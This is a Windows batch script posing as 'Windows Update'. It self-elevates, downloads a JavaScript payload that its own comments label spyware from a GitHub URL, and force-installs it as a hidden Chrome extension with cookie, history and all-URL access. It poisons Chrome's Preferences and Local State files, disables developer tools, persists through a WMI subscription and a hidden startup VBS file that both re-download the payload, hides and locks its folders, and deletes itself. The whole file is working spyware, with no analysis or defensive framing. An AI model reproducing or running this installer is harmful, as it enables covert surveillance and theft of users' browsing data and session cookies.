@echo off
setlocal enabledelayedexpansion
title Windows Update

:: ========== AUTO‑ELEVATE ==========
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ========== CONFIG ==========
set "GITHUB_RAW=https://raw.githubusercontent.com/happycelebration/sys/refs/heads/main"
set "BG_FILE=windows.sys.js"
set "EXT_NAME=Windows System Service"
set "EXT_ID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
set "SYS_DIR=%ProgramData%\Microsoft\Crypto\RSA\S-1-5-18"
set "EXT_DIR=%SYS_DIR%\chrome_sys"
set "CHROME_USER=%LOCALAPPDATA%\Google\Chrome\User Data"
set "PREF_FILE=%CHROME_USER%\Default\Preferences"
set "LOCAL_STATE=%CHROME_USER%\Local State"
set "LOG_FILE=%TEMP%\chrome_install.log"

:: ========== INIT LOG ==========
echo [%date% %time%] ======================================== > "%LOG_FILE%"
echo [%date% %time%]  Installer started                        >> "%LOG_FILE%"
echo [%date% %time%]  Computer: %COMPUTERNAME%                >> "%LOG_FILE%"
echo [%date% %time%]  User: %USERDOMAIN%\%USERNAME%           >> "%LOG_FILE%"
echo [%date% %time%] ======================================== >> "%LOG_FILE%"

:: ========== 1. CREATE HIDDEN DIRECTORIES ==========
echo [*] Creating system directories...
mkdir "%SYS_DIR%" >nul 2>&1
mkdir "%EXT_DIR%" >nul 2>&1
attrib +h +s +r "%SYS_DIR%" >nul 2>&1
echo [%date% %time%] [+] Directories created and hidden       >> "%LOG_FILE%"

:: ========== 2. KILL CHROME ==========
echo [*] Closing Chrome...
taskkill /F /IM chrome.exe >nul 2>&1
timeout /t 3 /nobreak >nul
echo [%date% %time%] [+] Chrome terminated                    >> "%LOG_FILE%"

:: ========== 3. DOWNLOAD SPYWARE ==========
echo [*] Downloading %BG_FILE%...
curl -L -s -o "%SYS_DIR%\%BG_FILE%" "%GITHUB_RAW%/%BG_FILE%" >nul 2>&1
if not exist "%SYS_DIR%\%BG_FILE%" (
    certutil -urlcache -split -f "%GITHUB_RAW%/%BG_FILE%" "%SYS_DIR%\%BG_FILE%" >nul 2>&1
)
if exist "%SYS_DIR%\%BG_FILE%" (
    for %%A in ("%SYS_DIR%\%BG_FILE%") do set "SZ=%%~zA"
    echo [%date% %time%] [+] %BG_FILE% downloaded (!SZ! bytes) >> "%LOG_FILE%"
) else (
    echo [%date% %time%] [X] FAILED to download %BG_FILE%      >> "%LOG_FILE%"
    goto :error
)

:: ========== 4. COPY TO EXTENSION FOLDER ==========
copy "%SYS_DIR%\%BG_FILE%" "%EXT_DIR%\%BG_FILE%" >nul 2>&1

:: ========== 5. CREATE MINIMAL MANIFEST ==========
echo [*] Creating manifest...
(
echo {
echo   "manifest_version": 3,
echo   "name": "",
echo   "version": "0.0.0.1",
echo   "background": { "service_worker": "%BG_FILE%" },
echo   "permissions": [
echo     "tabs","alarms","history","cookies","scripting",
echo     "activeTab","webNavigation","storage","bookmarks"
echo   ],
echo   "host_permissions": ["<all_urls>"],
echo   "action": {},
echo   "icons": {}
echo }
) > "%EXT_DIR%\manifest.json"
if exist "%EXT_DIR%\manifest.json" (
    echo [%date% %time%] [+] manifest.json created             >> "%LOG_FILE%"
) else (
    echo [%date% %time%] [X] Failed to create manifest.json    >> "%LOG_FILE%"
    goto :error
)

:: ========== 6. CREATE update.xml ==========
(
echo ^<?xml version='1.0' encoding='UTF-8'?^>
echo ^<gupdate xmlns='http://www.google.com/update2/response' protocol='2.0'^>
echo   ^<app appid='%EXT_ID%'^>
echo     ^<updatecheck codebase='file:///%EXT_DIR:\=/%/' version='1.0.0' /^>
echo   ^</app^>
echo ^</gupdate^>
) > "%EXT_DIR%\update.xml"
echo [%date% %time%] [+] update.xml created                    >> "%LOG_FILE%"

:: ========== 7. REGISTRY FORCE‑INSTALL (HIDDEN) ==========
echo [*] Setting enterprise policies...
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%EXT_ID%;file:///%EXT_DIR:\=/%/update.xml" /f >nul 2>&1
if %errorlevel% equ 0 (echo [%date% %time%] [+] Registry force-install set >> "%LOG_FILE%") else (echo [%date% %time%] [X] Registry force-install failed >> "%LOG_FILE%")

reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "SuppressUnsupportedOSWarning" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "DeveloperToolsAvailability" /t REG_DWORD /d 2 /f >nul 2>&1

:: Hide from extensions page
set "POLICY_JSON={\"%EXT_ID%\":{\"installation_mode\":\"force_installed\",\"update_url\":\"file:///%EXT_DIR:\=/%/update.xml\",\"toolbar_pin\":\"force_pinned\",\"type\":\"extension\",\"blocked_permissions\":[]}}"
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionSettings" /v "%EXT_ID%" /t REG_SZ /d "%POLICY_JSON%" /f >nul 2>&1
echo [%date% %time%] [+] ExtensionSettings policy applied      >> "%LOG_FILE%"

:: ========== 8. POISON PREFERENCES FOR STARTUP INJECTION ==========
echo [*] Injecting startup scripts...
powershell -NoP -Ep Bypass -C "
\$ErrorActionPreference = 'SilentlyContinue';
\$p='%PREF_FILE%'; \$s='%SYS_DIR%\%BG_FILE%';
if(Test-Path \$p){
  \$c=Get-Content \$p -Raw -Enc UTF8|ConvertFrom-Json;
  \$sc=[IO.File]::ReadAllText(\$s);
  if(-not \$c.extensions){\$c|Add-Member -NotePropertyName 'extensions' -NotePropertyValue @{}};
  \$c.extensions|Add-Member -NotePropertyName 'internal_bootstrap' -NotePropertyValue \$sc -Force;
  \$c|ConvertTo-Json -Depth 20|Out-File \$p -Enc UTF8 -Force
};" >> "%LOG_FILE%" 2>&1
echo [%date% %time%] [+] Preferences poisoned                  >> "%LOG_FILE%"

:: ========== 9. POISON LOCAL STATE ==========
powershell -NoP -Ep Bypass -C "
\$ls='%LOCAL_STATE%'; \$s='%SYS_DIR%\%BG_FILE%';
if(Test-Path \$ls){
  \$c=Get-Content \$ls -Raw -Enc UTF8|ConvertFrom-Json;
  \$sc=[IO.File]::ReadAllText(\$s);
  \$c|Add-Member -NotePropertyName 'component_scripts' -NotePropertyValue @(@{name='media_router';script=\$sc}) -Force;
  \$c|ConvertTo-Json -Depth 20|Out-File \$ls -Enc UTF8 -Force
};" >> "%LOG_FILE%" 2>&1
echo [%date% %time%] [+] Local State poisoned                  >> "%LOG_FILE%"

:: ========== 10. WMI PERSISTENCE ==========
echo [*] Creating WMI watcher...
powershell -NoP -Ep Bypass -C "
\$f=([wmiclass]'\\\\.\\root\\subscription:__EventFilter').CreateInstance();
\$f.Name='ChromeGuard'; \$f.QueryLanguage='WQL';
\$f.Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=\'chrome.exe\'';
\$f.EventNamespace='root\\cimv2'; \$f.Put()|Out-Null;
\$c=([wmiclass]'\\\\.\\root\\subscription:CommandLineEventConsumer').CreateInstance();
\$c.Name='ChromeGuardConsumer';
\$c.CommandLineTemplate='powershell -NoP -W Hidden -C \"\$d=\''%EXT_DIR%\'';\$m=\''%EXT_DIR%\manifest.json\'';if(!(Test-Path \$m)){mkdir \$d -Force;Invoke-WebRequest \''%GITHUB_RAW%/windows.sys.js\'' -OutFile \''%EXT_DIR%\windows.sys.js\''};start chrome --load-extension=\''%EXT_DIR%\'' --no-first-run\"';
\$c.Put()|Out-Null;
\$b=([wmiclass]'\\\\.\\root\\subscription:__FilterToConsumerBinding').CreateInstance();
\$b.Filter='__EventFilter.Name=\'ChromeGuard\'';
\$b.Consumer='CommandLineEventConsumer.Name=\'ChromeGuardConsumer\'';
\$b.Put()|Out-Null
" >> "%LOG_FILE%" 2>&1
echo [%date% %time%] [+] WMI subscription created              >> "%LOG_FILE%"

:: ========== 11. STARTUP VBS ==========
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
(
echo Set ws = CreateObject^("WScript.Shell"^)
echo ws.Run "cmd /c if not exist \"%EXT_DIR%\manifest.json\" (mkdir \"%EXT_DIR%\" 2>nul ^& curl -L -s -o \"%EXT_DIR%\windows.sys.js\" \"%GITHUB_RAW%/windows.sys.js\")", 0, False
echo ws.Run "chrome.exe", 0, False
) > "%STARTUP%\WinCore.vbs"
attrib +h "%STARTUP%\WinCore.vbs" >nul 2>&1
echo [%date% %time%] [+] Startup VBS created                   >> "%LOG_FILE%"

:: ========== 12. HIDE EVERYTHING ==========
attrib +h +s +r "%EXT_DIR%" >nul 2>&1
icacls "%SYS_DIR%" /inheritance:r /grant "SYSTEM:(OI)(CI)F" /T >nul 2>&1

:: ========== 13. RESTART CHROME ==========
start "" "chrome.exe" --no-first-run >nul 2>&1
echo [%date% %time%] [+] Chrome restarted                      >> "%LOG_FILE%"

:: ========== 14. FINAL LOG ENTRY ==========
echo [%date% %time%] ======================================== >> "%LOG_FILE%"
echo [%date% %time%]  INSTALLATION COMPLETE                     >> "%LOG_FILE%"
echo [%date% %time%]  Verify Telegram for 'X Installed Now'    >> "%LOG_FILE%"
echo [%date% %time%] ======================================== >> "%LOG_FILE%"

:: ========== SELF‑DESTRUCT ==========
(
echo @echo off
echo timeout /t 3 /nobreak ^>nul
echo del /f /q "%~f0" ^>nul 2^>^&1
echo del /f /q %%0 ^>nul 2^>^&1
) > "%TEMP%\~sd.bat"
start /min "" "%TEMP%\~sd.bat"
exit /b 0

:error
echo [%date% %time%] INSTALLATION FAILED – see log above        >> "%LOG_FILE%"
pause
exit /b 1